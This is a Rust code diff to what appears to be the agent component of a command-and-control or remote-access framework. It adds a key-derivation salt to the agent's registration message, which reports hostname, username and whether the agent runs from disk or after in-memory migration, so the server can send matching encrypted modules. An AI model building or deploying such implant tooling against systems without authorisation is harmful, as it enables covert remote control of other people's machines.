@@ -41,6 +41,9 @@ pub struct RegisterPayload {
     /// 连接来源: "disk" (磁盘运行) 或 "memory" (内存迁移)
     #[serde(default = "default_source")]
     pub source: String,
+    /// Per-build KDF salt (base64), so server module HMAC matches agent get_aes_key().
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub kdf_salt: Option<String>,
 }
 
 fn default_source() -> String { "disk".to_string() }
@@ -138,6 +141,20 @@ impl SystemInfo {
     
     /// 将系统信息转换为注册消息
     pub fn to_register_message(&self) -> MessageWrapper {
+        // Report build KDF salt so server can pack modules with matching derive_module_key
+        let salt = crate::config::get_encryption_salt();
+        let kdf_salt = if salt.iter().any(|&b| b != 0) {
+            Some(base64::Engine::encode(
+                &base64::engine::general_purpose::STANDARD,
+                &salt,
+            ))
+        } else {
+            // Still send zeros as explicit salt for empty-salt builds
+            Some(base64::Engine::encode(
+                &base64::engine::general_purpose::STANDARD,
+                &salt,
+            ))
+        };
         let payload = RegisterPayload {
             uuid: self.uuid.clone(),
             hostname: self.hostname.clone(),
@@ -145,8 +162,9 @@ impl SystemInfo {
             arch: self.arch.clone(),
             username: self.username.clone(),
             source: self.source.clone(),
+            kdf_salt,
         };
-        
+
         MessageWrapper {
             msg_type: MessageType::Register,
             payload: serde_json::to_value(&payload).unwrap_or(serde_json::Value::Null),
@@ -198,6 +216,7 @@ mod tests {
             arch: "x86_64".to_string(),
             username: "testuser".to_string(),
             source: "test".to_string(),
+            kdf_salt: None,
         };
 
         // 序列化
@@ -250,6 +269,7 @@ mod tests {
             arch: "x86_64".to_string(),
             username: "testuser".to_string(),
             source: "test".to_string(),
+            kdf_salt: None,
         };
 
         let wrapper = MessageWrapper {
